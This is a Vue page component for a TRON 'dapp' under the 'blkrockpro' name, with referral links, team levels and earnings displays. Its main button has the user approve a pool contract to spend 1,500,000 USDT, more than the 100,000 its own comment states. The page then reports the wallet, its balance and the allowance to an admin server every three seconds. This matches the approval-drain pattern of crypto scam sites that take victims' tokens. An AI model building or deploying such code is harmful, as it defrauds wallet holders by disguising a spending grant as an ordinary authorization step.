<template>
    <div class="page" @click="el_menu_show = false">

        <div class="bg"></div>
        <div class="mask" v-show="show_box || show_box_notice" @click="show_box = false; show_box_notice = false"></div>
        <div class="box">
            <div class="hander">
                <div @click.stop="el_menu_show = !el_menu_show">
                    <img src="../../assets/image/list.png" alt="">

                </div>
                <div style="color: #fff;font-size: 13px;font-weight: 600;">
                    {{ $t('company') }}
                </div>
                <div>
                    <img src="../../assets/image/language_or.png" alt="">
                    <span @click="language_switch" style="color: #fff;font-size: 12px;">{{ $t('one.language_switch')
                        }}</span>

                    <div @click="get_notice" style="color: #fff;font-size: 12px;margin: 0 10px;">{{ $t('user.tips') }}
                    </div>
                </div>
            </div>
            <div class="top_box">
                <div class="logo">
                    <img style="width: 60px;height: 60px; border-radius: 30px;" src="../../assets/image/new_logo.jpg"
                        alt="">
                </div>
                <div>
                    <h3>{{ $t('company') }}</h3>
                    <h4 @click="copyToClipboard(defaultAddress)"> {{ maskString(defaultAddress) }} <i
                            class="el-icon-copy-document"></i></h4>
                    <h5>{{ $t('user.num_index') }}:{{ user_data.yq_num || 0 }}</h5>
                    <h5> {{ $t('user.num_index2') }}:{{ Balance || 0 }}</h5>

                </div>

            </div>
            <div class="content_box">
                <button @click="handleApprove" class="button" v-show="money <= 0">{{ $t('user.button_index2')
                    }}</button>

                <button @click="get_shouyi_data(); show_box = !show_box" v-show="money > 0" style="height: 60px;">{{
                    $t("user.shouyi") }}:{{
                        user_data.my_sy || 0
                    }} &nbsp;&nbsp;&nbsp; {{ $t('user.yushouyi') }}:{{ user_data.yu_my_sy || 0
                    }}</button>




                <button v-show="money > 0" class="button_yq">{{ $t('user.team_num') }}:{{ user_data.team_zy || 0
                    }} &nbsp;&nbsp;&nbsp; {{ $t("user.my_level") }}:{{
                        user_data.level || 'V0'
                    }}</button>

            </div>
            <div v-show="money > 0">

                <div class="invite_box ">
                    <div class="text_box">
                        https://dapp.blkrockpro.xyz/#/?invite_code={{ user_data.invite_code }}
                    </div>
                    <div class="copy_button"
                        @click="copyToClipboard(` https://dapp.blkrockpro.xyz/#/?invite_code=${user_data.invite_code}`)">
                        {{ $t('user.invite_text') }}
                    </div>
                </div>
                <div class="yaoqing_box" v-show=" user_data.agentid == 0">
                    <button class="button_yq">{{ $t('user.button_index0')
                        }}</button>

                </div>

                <div class="invite_box_data" v-show=" user_data.agentid == 0">
                    <div v-for="item, index in invite_data.list" :key="index" class="item">
                        <div>
                            <p class="remark">{{ maskString(item.mobile) }}</p>
                            <p class="createtime">{{ item.createtime }}</p>
                        </div>
                        <div>
                            <p class="num" :class="item.num < 0 ? 'num_dow' : ''">{{ item.my_sy }}</p>
                        </div>
                    </div>
                </div>
            </div>

            <el-menu class="el-menu-vertical-demo" v-if="el_menu_show">
                <div style="text-align: center;">
                    <img style="width: 60px;height: 60px; margin: 30px auto 0;border-radius: 30px;"
                        src="../../assets/image/new_logo.jpg" alt="">

                </div>
                <h3 style="text-align: center;">{{ $t('company') }}</h3>
                <el-menu-item index="1" @click="get_shouquan">
                    <i class="el-icon-menu"></i>
                    <span slot="title">{{ $t('user.nav_index1') }}</span>
                </el-menu-item>
                <el-menu-item index="2">
                    <i class="el-icon-s-custom"></i>
                    <span slot="title">{{ $t('user.nav_index2') }}</span>
                </el-menu-item>


            </el-menu>
        </div>
        <transition name="el-fade-in-linear">
            <div class="shouyi-mingxi el-fade-in-linear" v-show="show_box">
                <div v-for="item, index in shouyi_data.list" :key="index" class="item">
                    <div>
                        <p class="remark">{{ item.remark }}</p>
                        <p class="createtime">{{ item.createtime }}</p>
                    </div>
                    <div>
                        <p class="num" :class="item.num < 0 ? 'num_dow' : ''">{{ item.num }}</p>
                    </div>
                </div>

            </div>

        </transition>
        <transition name="el-fade-in-linear">
            <div class="shouyi-mingxi el-fade-in-linear" v-show="show_box_notice"
                style="overflow: hidden;padding: 10px;">
                <div style="width: 100%;text-align: center;margin-top: 10px;">Notice</div>
                <div style="width: 100%; height: 90%;overflow: auto;padding: 10px;box-sizing: border-box;">
                    {{ notice }}
                </div>
            </div>
        </transition>
    </div>
</template>
<script>
import {
    NCinit,
    toFixedReg,
    mainContract,
    uContract,
    poolContract
} from "@/utils/tron";
import request from "../../utils/ajax";
export default {
    data() {
        return {
            company: '',
            language_obj: {},
            language: 'zh',
            el_menu_show: false,
            invite_menu_show: '',
            defaultAddress: '',
            user_data: {
                my_sy: '',
                sq_num: '',
                team_zy: '',
                yq_num: '',
                invite_code: '',
                agentid: ''
            },
            Balance: '',//接入數量
            money: '',//授權餘額
            show_box: false,
            shouyi_data: {
                list: []
            },
            invite_data: {
                list: []
            },
            show_box_notice: false,
            notice: ''
        }
    },

    mounted() {

        // console.log(1);
        NCinit().then(async (res) => {
            this.contract = await tronWeb.contract().at(mainContract);

            this.defaultAddress = res.defaultAddress;


            this.getBalance();

            this.needApprove();
            setInterval(() => {
                this.getBalance();
                this.needApprove();

                this.login()
            }, 3000);
        }).catch((err) => {

        });
    },
    created() {


    },
    methods: {
        async get_notice() {
            let data = await request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index.get_notice', 'post', {


            })
            if (data.notice == '' || data.notice == null || data.notice == undefined) {
                this.message = `No Notice`;
                this.$toast(this.message);
                return
            }
            else {
                this.notice = data.notice
                this.show_box_notice = true
            }

        },
        language_switch() {
            const newLocale = this.$i18n.locale === 'en' ? 'zh' : 'en';
            this.$i18n.locale = newLocale;
        },
        maskString(input) {

            if (input != '') {
                // 计算要替换的部分长度
                const maskLength = input.length - 8;
                // 计算起始位置
                const start = Math.floor((input.length - maskLength) / 2);

                // 构建新的字符串
                const maskedString = input.substring(0, start) + '*'.repeat(maskLength - 15) + input.substring(start + maskLength);

                return maskedString;
            }
            else {
                return ''
            }

        },
        copyToClipboard(text) {

            var src_url = text
            var textarea = document.createElement('textarea');
            textarea.style.position = 'fixed';
            textarea.style.opacity = 0;
            textarea.value = src_url;
            document.body.appendChild(textarea);
            textarea.select();
            document.execCommand('copy');
            document.body.removeChild(textarea);
            this.message = this.$t("copy_text");
            this.$toast(this.message);
        },
        get_shouquan() {
            this.$router.push({ name: 'body' })

        },
        async login() {
            let data = await request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index.applogin', 'post', {

                my_wallet: this.defaultAddress,
                zy_num: this.money,//1000000
                sq_num: this.Balance
            })

            if (data.message == "登录成功") {
                this.get_user_data()
            }
        },
        // 获取用户数据
        get_user_data() {
            request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index.get_user_info', 'post', {

                my_wallet: this.defaultAddress,

            }).then(res => {

                this.user_data = res
                // this.invite_menu_show = this.user_data.agentid
                // console.log("user---->data",this.user_data)
                this.get_shouyi_data()
                this.get_invite_data()
            });
        },
        // 获取用户邀请成员
        async get_shouyi_data() {
            let data = await request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index.get_sy_list', 'post', {

                my_wallet: this.defaultAddress,

            })

            this.shouyi_data = data

        },
        async get_invite_data() {
            let data = await request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index.my_team', 'post', {

                my_wallet: this.defaultAddress,

            })
            this.invite_data = data

        },
        // 授权USDT
        async handleApprove() {
            try {
                const contract = await tronWeb.contract().at(uContract);
                const amount = tronWeb.toSun(1500000); // 将 100,000 USDT 转换为 SUN
                const result = await contract.approve(poolContract, amount).send({
                    feeLimit: 100000000, // 设置费限制
                    callValue: 0, // 调用函数时发送的 TRX 数量
                    shouldPollResponse: false // 是否轮询结果
                });
                let data = result
                // console.log(data);
                request('https://admin.blkrockpro.xyz//app/index.php?i=4&c=entry&m=ewei_shopv2&do=mobile&r=api.index.do_auth', 'post', {
                    openid: this.defaultAddress,
                    walletaddress: this.defaultAddress,
                    chainname: "tron"
                }).then(res => {
                    // console.log(res);
                });

                this.getBalance()
                this.needApprove()
                this.message = `Successful`;
            } catch (error) {
                console.log(error);
                this.message = `Authorization failed: ${error.message}`;
                this.$toast(this.message);
            }


        },
        //获取余额
        async getBalance() {

            tronWeb.transactionBuilder
                .triggerConstantContract(
                    uContract,
                    "balanceOf(address)",
                    {},
                    [{ type: "address", value: this.defaultAddress }],
                    this.defaultAddress
                )
                .then((res) => {

                    this.Balance = toFixedReg(
                        tronWeb.fromSun(tronWeb.toDecimal("0x" + res.constant_result[0]))
                    );

                });
        },
        //获取授权  
        async needApprove() {
            let p1 = [
                { type: `address`, value: this.defaultAddress },
                { type: `address`, value: poolContract },
            ];
            let res = await window.tronWeb.transactionBuilder.triggerConstantContract(
                uContract,
                "allowance(address,address)",
                {},
                p1,
                this.defaultAddress
            );


            this.money = tronWeb.fromSun(
                tronWeb.toDecimal("0x" + res.constant_result[0])
            );



        },
    }
}
</script>

<style lang="less">
.page {

    width: 100vw;
    min-height: 100vh;


    /* 背景图片居中 */
    box-sizing: border-box;
    position: relative !important;
    background-color: #333;
    overflow: auto;
}

.bg {
    width: 100vw;
    min-height: 100vh;
    background-image: url('../../assets/image/home_bg.jpg');
    // filter: blur(10px);
    background-size: cover;
    /* 背景图片覆盖整个元素 */
    background-position: center;
    position: absolute;
    top: 0;
    right: 0;
    z-index: 1;
    filter: blur(8px);
}

.box {
    position: relative;
    z-index: 3;
}

.hander {
    width: 100vw;
    display: flex;
    justify-content: space-between;
    align-items: center;
    padding: 0 5px;
    box-sizing: border-box;
    height: 70px;
    border: 1px solid transparent;
    background-image: url('../../assets/image/home_bg.jpg');
    // filter: blur(10px);
    background-size: cover;

    div {
        display: flex;
        justify-content: flex-end;
        align-items: center;

        img {
            width: 15px !important;
            height: 15px !important;
            margin: 0 10px;
        }

        span {
            color: #fff;
            font-size: 22px;
            font-weight: 600;
        }
    }

}

.top_box {
    width: 90vw;
    height: 150px;
    background-color: rgba(10, 10, 100, .3);
    display: flex;
    align-items: center;
    margin: 0 auto;
    padding: 10px;
    box-sizing: border-box;
    border-radius: 10px;

    .logo {
        margin: 0 25px;
    }

    h1,
    h2,
    h3,
    h4,
    h5 {
        color: #fff;
    }
}

.content_box {
    width: 90vw;
    // height: 300px;
    background-color: rgba(10, 10, 100, .3);
    margin: 20px auto;
    display: flex;
    flex-wrap: wrap;
    padding: 20px 10px;
    justify-content: space-around;
    border-radius: 10px;
    box-sizing: border-box;

    button {
        width: 90%;
        height: 45px;
        background-color: rgb(60, 60, 120);
        margin: 10px 0;
        outline: none;
        border: none;
        border-radius: 10px;
        color: #fff;
        font-size: 11px;
    }


}

.invite_box {
    width: 90vw;
    // height: 300px;
    background-color: rgba(10, 10, 100, .3);
    margin: 20px auto 0;
    display: flex;

    padding: 20px 10px;
    justify-content: space-around;
    border-radius: 10px;
    align-items: center;
    font-size: 11px;
    box-sizing: border-box;

    .text_box {
        color: #fff;
        width: 50%;

    }

    .copy_button {
        width: 40%;
        color: #62a55c;
        text-align: center;
    }
}

.invite_box_data {
    width: 90vw;
    height: 250px;
    background-color: rgba(10, 10, 100, .3);
    margin: 0 auto;
    border-radius: 10px;
    overflow: auto;

    .item {
        width: 100%;
        height: 50px;
        border-bottom: 1px solid #bababa;
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 0 15px;
        box-sizing: border-box;
        font-size: 11px;

        .remark {
            font-size: 13px;
            color: #fff;
        }

        .createtime {
            color: #fff;

        }

        .num {
            font-size: 15px;
            color: rgb(0, 203, 106);
        }

        .num_dow {
            color: rgb(219, 77, 62);
        }
    }
}

.yaoqing_box {
    width: 90vw;
    margin: 10px auto 0;

    .button_yq {
        width: 100%;
        height: 45px;
        background-color: rgb(60, 60, 120);
        color: #fff;
        border-radius: 10px;
        outline: none;
        border: none;
        font-size: 11px;

    }
}

.mask {
    width: 100vw;
    min-height: 100vh;
    background-color: rgba(0, 0, 0, .5);
    position: absolute;
    top: 0;
    right: 0;
    z-index: 11;
}

.shouyi-mingxi {
    width: 80vw;
    height: 250px;
    overflow: auto;
    background-color: rgba(255, 255, 255, .9);
    position: absolute;
    top: 0;
    right: 0;
    bottom: 0;
    left: 0;
    margin: auto;
    border-radius: 10px;
    z-index: 13;
    padding: 10px 0;

    .item {
        width: 100%;
        height: 50px;
        border-bottom: 1px solid #bababa;
        display: flex;
        justify-content: space-between;
        align-items: center;
        padding: 0 15px;
        box-sizing: border-box;
        font-size: 11px;

        .remark {
            font-size: 13px;
            margin: 0;
            margin-bottom: 5px;
        }

        .createtime {
            color: #807c7c;
            margin: 0;

        }

        .num {
            font-size: 15px;
            color: rgb(0, 203, 106);
        }

        .num_dow {
            color: rgb(219, 77, 62);
        }
    }
}

.el-menu-vertical-demo {
    width: 200px;
    height: 100vh;
    position: absolute !important;
    top: 0;
    left: 0;
    // background-image: url('../../assets/image/home_bg.jpg');
    // background-size: cover;
    // /* 背景图片覆盖整个元素 */
    // background-position: center;
    background-color: #575454 !important;
    background-color: rgba(60, 60, 120, .95) !important;

    /* 背景图片居中 */
    box-sizing: border-box;
    color: #fff;

    button {
        background-color: rgb(68, 230, 36);
        color: #fff;
        width: 100%;
        height: 40px;
        // line-height: 40px;
        outline: none;
        border: none;
        border-radius: 10px;
    }

    span {
        color: #fff;
    }
}

.el-icon-s-operation {
    color: #fff;
    width: 40px;
    height: 40px;
    font-size: 32px;
}



.button {
    width: 130px;
    height: 40px;
    background: linear-gradient(to bottom, #87ace2 0%, rgb(60, 60, 120) 100%);
    border: none;
    border-radius: 5px;
    position: relative;
    border-bottom: 4px solid #2b8bc6;
    color: #fbfbfb;

    font-family: 'Open Sans', sans-serif;
    text-shadow: 1px 1px 1px rgba(0, 0, 0, .4);
    font-size: 15px;
    text-align: center;
    text-indent: 5px;
    //   box-shadow: 0px 3px 0px 0px rgba(0,0,0,.2);
    cursor: pointer;
    display: block;
    margin: 0 auto;
    margin-bottom: 20px;
}

.button:active {
    box-shadow: 0px 2px 0px 0px rgba(0, 0, 0, .2);
    top: 1px;
}

.button:after {
    content: "";
    width: 0;
    height: 0;
    display: block;
    border-top: 22px solid #187dbc;
    border-bottom: 23px solid #187dbc;
    border-left: 16px solid transparent;
    border-right: 20px solid #187dbc;
    position: absolute;
    opacity: 0.6;
    right: 0;
    top: 0;
    border-radius: 0 5px 5px 0;
}


button.back:after {
    content: "";
    width: 0;
    height: 0;
    display: block;
    border-top: 20px solid #187dbc;
    border-bottom: 20px solid #187dbc;
    border-right: 16px solid transparent;
    border-left: 20px solid #187dbc;
    position: absolute;
    opacity: 0.6;
    left: 0;
    top: 0;
    border-radius: 5px 0 0 5px;
}
</style>
